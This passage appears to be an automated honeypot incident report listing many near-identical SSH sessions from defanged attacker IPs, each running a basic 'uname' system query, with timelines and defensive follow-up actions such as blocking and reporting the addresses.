| `2026-08-16 18:42:54` | `cowrie.login.success` |
| `2026-08-16 18:42:55` | `cowrie.session.params` |
| `2026-08-16 18:42:55` | `cowrie.command.input` |
| `2026-08-16 18:42:55` | `cowrie.log.closed` |
| `2026-08-16 18:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e216efab50b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:42 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:42:58` | `cowrie.session.connect` |
| `2026-08-16 18:42:58` | `cowrie.client.version` |
| `2026-08-16 18:42:59` | `cowrie.client.kex` |
| `2026-08-16 18:42:59` | `cowrie.login.success` |
| `2026-08-16 18:43:00` | `cowrie.session.params` |
| `2026-08-16 18:43:00` | `cowrie.command.input` |
| `2026-08-16 18:43:00` | `cowrie.log.closed` |
| `2026-08-16 18:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a0e408590bc

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:04` | `cowrie.session.connect` |
| `2026-08-16 18:43:04` | `cowrie.client.version` |
| `2026-08-16 18:43:04` | `cowrie.client.kex` |
| `2026-08-16 18:43:04` | `cowrie.login.success` |
| `2026-08-16 18:43:05` | `cowrie.session.params` |
| `2026-08-16 18:43:05` | `cowrie.command.input` |
| `2026-08-16 18:43:05` | `cowrie.log.closed` |
| `2026-08-16 18:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-517284d54e91

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:09` | `cowrie.session.connect` |
| `2026-08-16 18:43:09` | `cowrie.client.version` |
| `2026-08-16 18:43:09` | `cowrie.client.kex` |
| `2026-08-16 18:43:10` | `cowrie.login.success` |
| `2026-08-16 18:43:11` | `cowrie.session.params` |
| `2026-08-16 18:43:11` | `cowrie.command.input` |
| `2026-08-16 18:43:11` | `cowrie.log.closed` |
| `2026-08-16 18:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bc228997314

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:15` | `cowrie.session.connect` |
| `2026-08-16 18:43:15` | `cowrie.client.version` |
| `2026-08-16 18:43:15` | `cowrie.client.kex` |
| `2026-08-16 18:43:15` | `cowrie.login.success` |
| `2026-08-16 18:43:16` | `cowrie.session.params` |
| `2026-08-16 18:43:16` | `cowrie.command.input` |
| `2026-08-16 18:43:16` | `cowrie.log.closed` |
| `2026-08-16 18:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f7773a1fb85

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:20` | `cowrie.session.connect` |
| `2026-08-16 18:43:20` | `cowrie.client.version` |
| `2026-08-16 18:43:20` | `cowrie.client.kex` |
| `2026-08-16 18:43:20` | `cowrie.login.success` |
| `2026-08-16 18:43:21` | `cowrie.session.params` |
| `2026-08-16 18:43:21` | `cowrie.command.input` |
| `2026-08-16 18:43:21` | `cowrie.log.closed` |
| `2026-08-16 18:43:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe9c0d61a94

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:25` | `cowrie.session.connect` |
| `2026-08-16 18:43:25` | `cowrie.client.version` |
| `2026-08-16 18:43:25` | `cowrie.client.kex` |
| `2026-08-16 18:43:26` | `cowrie.login.success` |
| `2026-08-16 18:43:26` | `cowrie.session.params` |
| `2026-08-16 18:43:26` | `cowrie.command.input` |
| `2026-08-16 18:43:27` | `cowrie.log.closed` |
| `2026-08-16 18:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26460597efbd

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:30` | `cowrie.session.connect` |
| `2026-08-16 18:43:30` | `cowrie.client.version` |
| `2026-08-16 18:43:30` | `cowrie.client.kex` |
| `2026-08-16 18:43:31` | `cowrie.login.success` |
| `2026-08-16 18:43:32` | `cowrie.session.params` |
| `2026-08-16 18:43:32` | `cowrie.command.input` |
| `2026-08-16 18:43:32` | `cowrie.log.closed` |
| `2026-08-16 18:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f13a7e5e00e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:36` | `cowrie.session.connect` |
| `2026-08-16 18:43:36` | `cowrie.client.version` |
| `2026-08-16 18:43:36` | `cowrie.client.kex` |
| `2026-08-16 18:43:36` | `cowrie.login.success` |
| `2026-08-16 18:43:37` | `cowrie.session.params` |
| `2026-08-16 18:43:37` | `cowrie.command.input` |
| `2026-08-16 18:43:37` | `cowrie.log.closed` |
| `2026-08-16 18:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1da12cce533

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:41` | `cowrie.session.connect` |
| `2026-08-16 18:43:41` | `cowrie.client.version` |
| `2026-08-16 18:43:41` | `cowrie.client.kex` |
| `2026-08-16 18:43:42` | `cowrie.login.success` |
| `2026-08-16 18:43:42` | `cowrie.session.params` |
| `2026-08-16 18:43:42` | `cowrie.command.input` |
| `2026-08-16 18:43:42` | `cowrie.log.closed` |
| `2026-08-16 18:43:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bb895c69952

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:46` | `cowrie.session.connect` |
| `2026-08-16 18:43:46` | `cowrie.client.version` |
| `2026-08-16 18:43:46` | `cowrie.client.kex` |
| `2026-08-16 18:43:47` | `cowrie.login.success` |
| `2026-08-16 18:43:48` | `cowrie.session.params` |
| `2026-08-16 18:43:48` | `cowrie.command.input` |
| `2026-08-16 18:43:48` | `cowrie.log.closed` |
| `2026-08-16 18:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f87556dfae0c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:51` | `cowrie.session.connect` |
| `2026-08-16 18:43:51` | `cowrie.client.version` |
| `2026-08-16 18:43:51` | `cowrie.client.kex` |
| `2026-08-16 18:43:52` | `cowrie.login.success` |
| `2026-08-16 18:43:53` | `cowrie.session.params` |
| `2026-08-16 18:43:53` | `cowrie.command.input` |
| `2026-08-16 18:43:53` | `cowrie.log.closed` |
| `2026-08-16 18:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca8e1e8ab292

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:43 |
| **Last Seen** | 2026-08-16 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:43:57` | `cowrie.session.connect` |
| `2026-08-16 18:43:57` | `cowrie.client.version` |
| `2026-08-16 18:43:57` | `cowrie.client.kex` |
| `2026-08-16 18:43:57` | `cowrie.login.success` |
| `2026-08-16 18:43:58` | `cowrie.session.params` |
| `2026-08-16 18:43:58` | `cowrie.command.input` |
| `2026-08-16 18:43:58` | `cowrie.log.closed` |
| `2026-08-16 18:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4647767ff18f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:02` | `cowrie.session.connect` |
| `2026-08-16 18:44:02` | `cowrie.client.version` |
| `2026-08-16 18:44:02` | `cowrie.client.kex` |
| `2026-08-16 18:44:02` | `cowrie.login.success` |
| `2026-08-16 18:44:03` | `cowrie.session.params` |
| `2026-08-16 18:44:03` | `cowrie.command.input` |
| `2026-08-16 18:44:03` | `cowrie.log.closed` |
| `2026-08-16 18:44:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ad3221a57f4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:07` | `cowrie.session.connect` |
| `2026-08-16 18:44:07` | `cowrie.client.version` |
| `2026-08-16 18:44:07` | `cowrie.client.kex` |
| `2026-08-16 18:44:07` | `cowrie.login.success` |
| `2026-08-16 18:44:08` | `cowrie.session.params` |
| `2026-08-16 18:44:08` | `cowrie.command.input` |
| `2026-08-16 18:44:08` | `cowrie.log.closed` |
| `2026-08-16 18:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6725ee6b1b8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:12` | `cowrie.session.connect` |
| `2026-08-16 18:44:12` | `cowrie.client.version` |
| `2026-08-16 18:44:12` | `cowrie.client.kex` |
| `2026-08-16 18:44:13` | `cowrie.login.success` |
| `2026-08-16 18:44:13` | `cowrie.session.params` |
| `2026-08-16 18:44:13` | `cowrie.command.input` |
| `2026-08-16 18:44:13` | `cowrie.log.closed` |
| `2026-08-16 18:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97699b7f9786

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:18` | `cowrie.session.connect` |
| `2026-08-16 18:44:18` | `cowrie.client.version` |
| `2026-08-16 18:44:18` | `cowrie.client.kex` |
| `2026-08-16 18:44:18` | `cowrie.login.success` |
| `2026-08-16 18:44:19` | `cowrie.session.params` |
| `2026-08-16 18:44:19` | `cowrie.command.input` |
| `2026-08-16 18:44:19` | `cowrie.log.closed` |
| `2026-08-16 18:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff81697869c4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:23` | `cowrie.session.connect` |
| `2026-08-16 18:44:23` | `cowrie.client.version` |
| `2026-08-16 18:44:23` | `cowrie.client.kex` |
| `2026-08-16 18:44:23` | `cowrie.login.success` |
| `2026-08-16 18:44:24` | `cowrie.session.params` |
| `2026-08-16 18:44:24` | `cowrie.command.input` |
| `2026-08-16 18:44:24` | `cowrie.log.closed` |
| `2026-08-16 18:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ade95975152

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:28` | `cowrie.session.connect` |
| `2026-08-16 18:44:28` | `cowrie.client.version` |
| `2026-08-16 18:44:28` | `cowrie.client.kex` |
| `2026-08-16 18:44:28` | `cowrie.login.success` |
| `2026-08-16 18:44:29` | `cowrie.session.params` |
| `2026-08-16 18:44:29` | `cowrie.command.input` |
| `2026-08-16 18:44:30` | `cowrie.log.closed` |
| `2026-08-16 18:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75607941cd8f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:34` | `cowrie.session.connect` |
| `2026-08-16 18:44:34` | `cowrie.client.version` |
| `2026-08-16 18:44:34` | `cowrie.client.kex` |
| `2026-08-16 18:44:34` | `cowrie.login.success` |
| `2026-08-16 18:44:35` | `cowrie.session.params` |
| `2026-08-16 18:44:35` | `cowrie.command.input` |
| `2026-08-16 18:44:35` | `cowrie.log.closed` |
| `2026-08-16 18:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aaa1848a726

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:34` | `cowrie.session.connect` |
| `2026-08-16 18:44:34` | `cowrie.client.version` |
| `2026-08-16 18:44:34` | `cowrie.client.kex` |
| `2026-08-16 18:44:35` | `cowrie.login.success` |
| `2026-08-16 18:44:36` | `cowrie.session.params` |
| `2026-08-16 18:44:36` | `cowrie.command.input` |
| `2026-08-16 18:44:36` | `cowrie.log.closed` |
| `2026-08-16 18:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bfd6029721c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:39` | `cowrie.session.connect` |
| `2026-08-16 18:44:39` | `cowrie.client.version` |
| `2026-08-16 18:44:39` | `cowrie.client.kex` |
| `2026-08-16 18:44:39` | `cowrie.login.success` |
| `2026-08-16 18:44:40` | `cowrie.session.params` |
| `2026-08-16 18:44:40` | `cowrie.command.input` |
| `2026-08-16 18:44:40` | `cowrie.log.closed` |
| `2026-08-16 18:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-914c7345cb47

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:44` | `cowrie.session.connect` |
| `2026-08-16 18:44:44` | `cowrie.client.version` |
| `2026-08-16 18:44:44` | `cowrie.client.kex` |
| `2026-08-16 18:44:45` | `cowrie.login.success` |
| `2026-08-16 18:44:46` | `cowrie.session.params` |
| `2026-08-16 18:44:46` | `cowrie.command.input` |
| `2026-08-16 18:44:46` | `cowrie.log.closed` |
| `2026-08-16 18:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70a764bfcca

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:49` | `cowrie.session.connect` |
| `2026-08-16 18:44:49` | `cowrie.client.version` |
| `2026-08-16 18:44:49` | `cowrie.client.kex` |
| `2026-08-16 18:44:50` | `cowrie.login.success` |
| `2026-08-16 18:44:50` | `cowrie.session.params` |
| `2026-08-16 18:44:50` | `cowrie.command.input` |
| `2026-08-16 18:44:50` | `cowrie.log.closed` |
| `2026-08-16 18:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-031d58f239db

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:44 |
| **Last Seen** | 2026-08-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:44:54` | `cowrie.session.connect` |
| `2026-08-16 18:44:54` | `cowrie.client.version` |
| `2026-08-16 18:44:54` | `cowrie.client.kex` |
| `2026-08-16 18:44:55` | `cowrie.login.success` |
| `2026-08-16 18:44:56` | `cowrie.session.params` |
| `2026-08-16 18:44:56` | `cowrie.command.input` |
| `2026-08-16 18:44:56` | `cowrie.log.closed` |
| `2026-08-16 18:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c956bf86f3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:00` | `cowrie.session.connect` |
| `2026-08-16 18:45:00` | `cowrie.client.version` |
| `2026-08-16 18:45:00` | `cowrie.client.kex` |
| `2026-08-16 18:45:00` | `cowrie.login.success` |
| `2026-08-16 18:45:01` | `cowrie.session.params` |
| `2026-08-16 18:45:01` | `cowrie.command.input` |
| `2026-08-16 18:45:01` | `cowrie.log.closed` |
| `2026-08-16 18:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af7e64126043

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
